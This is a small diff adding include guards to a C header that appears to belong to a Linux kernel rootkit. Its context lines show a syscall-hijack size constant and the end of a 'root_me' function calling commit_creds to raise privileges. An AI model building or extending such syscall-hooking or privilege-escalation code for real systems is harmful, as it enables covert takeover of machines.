@@ -1,3 +1,6 @@
+#ifndef SYSCALL_TABLE_H
+#define SYSCALL_TABLE_H
+
 #define HIJACK_SIZE 6
 
 #define DEBUG_HOOK(fmt, ...)
@@ -218,3 +221,5 @@ void root_me(void)
 
     commit_creds(new_cred);
 }
+
+#endif /* SYSCALL_TABLE_H */
